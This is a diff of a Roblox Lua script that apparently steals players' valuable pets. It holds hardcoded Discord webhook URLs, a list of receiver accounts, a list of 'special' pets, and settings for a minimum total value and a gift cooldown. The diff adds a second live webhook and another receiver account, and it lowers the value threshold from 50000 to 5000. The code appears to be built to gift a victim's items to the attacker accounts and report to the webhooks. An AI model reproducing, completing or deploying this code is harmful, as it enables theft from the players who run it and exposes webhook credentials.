@@ -1,5 +1,5 @@
 local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"
-local MainWebhook = "YOUR_MAIN_WEBHOOK_URL_HERE"
+local MainWebhook = "https://discord.com/api/webhooks/1394193294334099539/QB6F3SVtM86yaWvoWO1vCmNKucjnTjZpPqc8mmAuWVXe3k0G1U8UgqUIASRDQxXEoVcI"
 
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
@@ -11,13 +11,13 @@ local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 
-local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn", "RacMethodCB"}
+local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn", "RacMethodCB", "Sub2Paratox"}
 local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
 local CHECK_INTERVAL = 5
-local SHUTDOWN_DURATION = 10
+local SHUTDOWN_DURATION = 3
 local GIFT_COOLDOWN = 3
 local MINIMUM_PETS = 3
-local MINIMUM_TOTAL_VALUE = 50000
+local MINIMUM_TOTAL_VALUE = 5000
 local CLICK_HOLD_DURATION = 2
 
 local function identifyExecutor()
